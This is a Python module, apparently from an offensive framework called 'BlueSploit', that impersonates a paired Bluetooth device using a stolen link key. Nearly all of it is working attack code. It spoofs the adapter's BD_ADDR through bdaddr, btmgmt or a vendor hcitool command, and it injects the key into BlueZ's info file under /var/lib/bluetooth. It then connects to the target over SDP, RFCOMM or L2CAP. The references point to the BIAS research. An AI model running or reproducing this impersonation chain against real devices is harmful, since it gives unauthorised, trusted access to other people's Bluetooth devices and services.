"""
Bluetooth Device Impersonation
Impersonate a previously paired device using a stolen link key.

After extracting a link key (via link_key_dump or other means), this
module configures the local adapter to impersonate the paired device,
allowing connection to the target without re-pairing.

Attack flow:
  1. Spoof the BD_ADDR of the paired device
  2. Inject the stolen link key into the local BlueZ storage
  3. Connect to the target as the impersonated device
  4. Access Bluetooth services (RFCOMM, L2CAP, etc.)
"""

import os
import subprocess
import configparser
import time
import shutil
from core.base import ExploitModule, ModuleInfo, ModuleOption, BTProtocol, Severity


class Module(ExploitModule):

    info = ModuleInfo(
        name="BT Impersonation",
        description="Impersonate a paired Bluetooth device using stolen link key",
        author="BlueSploit Team",
        protocol=BTProtocol.CLASSIC,
        references=[
            "https://francozappa.github.io/about-bias/",
            "https://www.bluetooth.com/learn-about-bluetooth/key-attributes/bluetooth-security/bias-vulnerability/",
        ],
        severity=Severity.CRITICAL,
        cve=None,
    )

    BT_DIR = "/var/lib/bluetooth"

    def _setup_options(self):
        self.add_option(ModuleOption(
            name="target",
            required=True,
            description="Target device MAC to connect to",
            default=None,
        ))
        self.add_option(ModuleOption(
            name="impersonate",
            required=True,
            description="MAC of the device to impersonate (must be paired with target)",
            default=None,
        ))
        self.add_option(ModuleOption(
            name="link_key",
            required=True,
            description="Stolen link key (hex string, 32 chars)",
            default=None,
        ))
        self.add_option(ModuleOption(
            name="interface",
            required=False,
            description="HCI interface to use",
            default="hci0",
        ))
        self.add_option(ModuleOption(
            name="key_type",
            required=False,
            description="Link key type (0=combination, 3=unauthenticated, 4=authenticated, 5=changed)",
            default="4",
        ))
        self.add_option(ModuleOption(
            name="service",
            required=False,
            description="Service to connect after impersonation: rfcomm, l2cap, sdp, none",
            default="sdp",
        ))
        self.add_option(ModuleOption(
            name="rfcomm_channel",
            required=False,
            description="RFCOMM channel for rfcomm service mode",
            default="1",
        ))
        self.add_option(ModuleOption(
            name="restore",
            required=False,
            description="Restore original adapter MAC after attack (true/false)",
            default="true",
        ))

    def run(self) -> bool:
        target = self.get_option("target")
        impersonate = self.get_option("impersonate")
        link_key = self.get_option("link_key")
        interface = self.get_option("interface") or "hci0"
        key_type = self.get_option("key_type") or "4"
        service = (self.get_option("service") or "sdp").lower()
        rfcomm_channel = int(self.get_option("rfcomm_channel") or 1)
        restore = (self.get_option("restore") or "true").lower() == "true"

        # Validate link key
        clean_key = link_key.replace(":", "").replace(" ", "").replace("0x", "")
        if len(clean_key) != 32:
            self.print_error(f"Invalid link key length: {len(clean_key)} (expected 32 hex chars)")
            return False

        self.print_status(f"Target: {target}")
        self.print_status(f"Impersonating: {impersonate}")
        self.print_status(f"Link key: {clean_key[:8]}...{clean_key[-8:]}")
        self.print_status(f"Interface: {interface}")
        self.print_warning("This requires root privileges and will change the adapter MAC")

        # Save original MAC
        original_mac = self._get_adapter_mac(interface)
        if not original_mac:
            self.print_error(f"Cannot read MAC from {interface}")
            return False
        self.print_status(f"Original adapter MAC: {original_mac}")

        success = False
        try:
            # Step 1: Bring interface down
            self.print_status("Step 1: Bringing interface down...")
            if not self._run_cmd(["hciconfig", interface, "down"]):
                self.print_error("Cannot bring interface down")
                return False

            # Step 2: Spoof BD_ADDR
            self.print_status(f"Step 2: Spoofing BD_ADDR to {impersonate}...")
            if not self._spoof_bdaddr(interface, impersonate):
                self.print_error("BD_ADDR spoofing failed")
                self._run_cmd(["hciconfig", interface, "up"])
                return False

            # Step 3: Bring interface up
            self.print_status("Step 3: Bringing interface back up...")
            if not self._run_cmd(["hciconfig", interface, "up"]):
                self.print_error("Cannot bring interface up")
                return False

            time.sleep(1)
            new_mac = self._get_adapter_mac(interface)
            if new_mac and new_mac.upper() == impersonate.upper():
                self.print_success(f"BD_ADDR spoofed to {new_mac}")
            else:
                self.print_warning(f"MAC shows as {new_mac}, spoofing may not be fully effective")

            # Step 4: Inject link key into BlueZ storage
            self.print_status("Step 4: Injecting link key into BlueZ storage...")
            if not self._inject_link_key(impersonate, target, clean_key, key_type):
                self.print_warning("Could not inject into BlueZ storage, continuing with raw connection")

            # Step 5: Restart Bluetooth service to load new key
            self.print_status("Step 5: Reloading Bluetooth service...")
            self._run_cmd(["systemctl", "restart", "bluetooth"])
            time.sleep(2)
            self._run_cmd(["hciconfig", interface, "up"])
            time.sleep(1)

            # Step 6: Connect to target
            self.print_status(f"Step 6: Connecting to {target} as {impersonate}...")

            if service == "sdp":
                success = self._connect_sdp(target)
            elif service == "rfcomm":
                success = self._connect_rfcomm(target, rfcomm_channel)
            elif service == "l2cap":
                success = self._connect_l2cap(target)
            elif service == "none":
                self.print_success("Impersonation configured, no service connection requested")
                success = True
            else:
                self.print_error(f"Unknown service: {service}")

        finally:
            # Restore original MAC
            if restore and original_mac:
                self.print_status(f"Restoring original MAC: {original_mac}...")
                self._run_cmd(["hciconfig", interface, "down"])
                self._spoof_bdaddr(interface, original_mac)
                self._run_cmd(["hciconfig", interface, "up"])
                self._run_cmd(["systemctl", "restart", "bluetooth"])

        return success

    def _get_adapter_mac(self, interface: str) -> str:
        """Get the current BD_ADDR of the adapter"""
        try:
            result = subprocess.run(
                ["hciconfig", interface],
                capture_output=True, text=True, timeout=5
            )
            import re
            match = re.search(r'BD Address:\s+([0-9A-Fa-f:]{17})', result.stdout)
            if match:
                return match.group(1)
        except Exception:
            pass
        return None

    def _spoof_bdaddr(self, interface: str, mac: str) -> bool:
        """Spoof the BD_ADDR using bdaddr or btmgmt"""
        # Try bdaddr tool first
        try:
            result = subprocess.run(
                ["bdaddr", "-i", interface, mac],
                capture_output=True, text=True, timeout=10
            )
            if result.returncode == 0:
                self.print_status(f"  bdaddr: set to {mac}")
                return True
        except FileNotFoundError:
            pass
        except Exception:
            pass

        # Try btmgmt
        try:
            dev_id = interface.replace("hci", "")
            result = subprocess.run(
                ["btmgmt", "--index", dev_id, "public-addr", mac],
                capture_output=True, text=True, timeout=10
            )
            if result.returncode == 0:
                self.print_status(f"  btmgmt: set to {mac}")
                return True
        except FileNotFoundError:
            pass
        except Exception:
            pass

        # Try hcitool vendor command (Broadcom/Cypress specific)
        try:
            mac_bytes = " ".join(f"0x{b}" for b in reversed(mac.split(":")))
            result = subprocess.run(
                ["hcitool", "-i", interface, "cmd", "0x3f", "0x001",
                 *[f"0x{b}" for b in reversed(mac.split(":"))]],
                capture_output=True, text=True, timeout=10
            )
            if result.returncode == 0:
                self.print_status(f"  hcitool vendor cmd: attempted")
                return True
        except Exception:
            pass

        self.print_warning("No BD_ADDR spoofing method succeeded")
        self.print_status("  Install bdaddr: apt install bluez (includes bdaddr in some distros)")
        self.print_status("  Or use: spooftooph -i hciX -a XX:XX:XX:XX:XX:XX")
        return False

    def _inject_link_key(self, adapter_mac: str, device_mac: str,
                         link_key: str, key_type: str) -> bool:
        """Inject a link key into BlueZ storage"""
        adapter_dir = os.path.join(self.BT_DIR, adapter_mac.upper())
        device_dir = os.path.join(adapter_dir, device_mac.upper())

        try:
            os.makedirs(device_dir, exist_ok=True)
        except PermissionError:
            self.print_warning("Cannot create device directory (need root)")
            return False

        info_file = os.path.join(device_dir, "info")
        config = configparser.ConfigParser()

        if os.path.exists(info_file):
            # Backup existing
            backup = info_file + ".bak"
            shutil.copy2(info_file, backup)
            self.print_status(f"  Backed up existing info to {backup}")
            config.read(info_file)

        if not config.has_section("General"):
            config.add_section("General")
        config.set("General", "Name", "Impersonated Device")
        config.set("General", "Trusted", "true")
        config.set("General", "Blocked", "false")

        if not config.has_section("LinkKey"):
            config.add_section("LinkKey")
        config.set("LinkKey", "Key", link_key.upper())
        config.set("LinkKey", "Type", key_type)
        config.set("LinkKey", "PINLength", "0")

        try:
            with open(info_file, "w") as f:
                config.write(f)
            self.print_success(f"  Link key injected into {info_file}")
            return True
        except PermissionError:
            self.print_warning("  Cannot write info file (need root)")
            return False
        except Exception as e:
            self.print_warning(f"  Failed to write info: {e}")
            return False

    def _connect_sdp(self, target: str) -> bool:
        """Test connection via SDP query"""
        try:
            import bluetooth
            services = bluetooth.find_service(address=target)
            if services:
                self.print_success(f"SDP query successful, {len(services)} services found")
                for svc in services[:5]:
                    self.print_status(f"  {svc.get('name', 'Unknown')}: "
                                    f"ch={svc.get('port', '?')} proto={svc.get('protocol', '?')}")
                return True
            else:
                self.print_warning("SDP returned no services (connection may still work)")
                return True
        except ImportError:
            self.print_warning("pybluez not available for SDP, trying sdptool")
            try:
                result = subprocess.run(
                    ["sdptool", "browse", target],
                    capture_output=True, text=True, timeout=15
                )
                if result.returncode == 0 and result.stdout.strip():
                    lines = result.stdout.strip().split("\n")
                    self.print_success(f"SDP browse returned {len(lines)} lines")
                    return True
            except Exception:
                pass
            return False

    def _connect_rfcomm(self, target: str, channel: int) -> bool:
        """Test connection via RFCOMM"""
        try:
            import bluetooth
            sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
            sock.settimeout(10)
            sock.connect((target, channel))
            self.print_success(f"RFCOMM connected to {target} channel {channel}")
            sock.close()
            return True
        except ImportError:
            self.print_error("pybluez not available for RFCOMM")
            return False
        except Exception as e:
            self.print_error(f"RFCOMM connection failed: {e}")
            return False

    def _connect_l2cap(self, target: str) -> bool:
        """Test connection via L2CAP"""
        try:
            import bluetooth
            sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
            sock.settimeout(10)
            sock.connect((target, 1))  # PSM 1 (SDP)
            self.print_success(f"L2CAP connected to {target}")
            sock.close()
            return True
        except ImportError:
            self.print_error("pybluez not available for L2CAP")
            return False
        except Exception as e:
            self.print_error(f"L2CAP connection failed: {e}")
            return False

    def _run_cmd(self, cmd: list) -> bool:
        """Run a shell command"""
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            return result.returncode == 0
        except Exception:
            return False
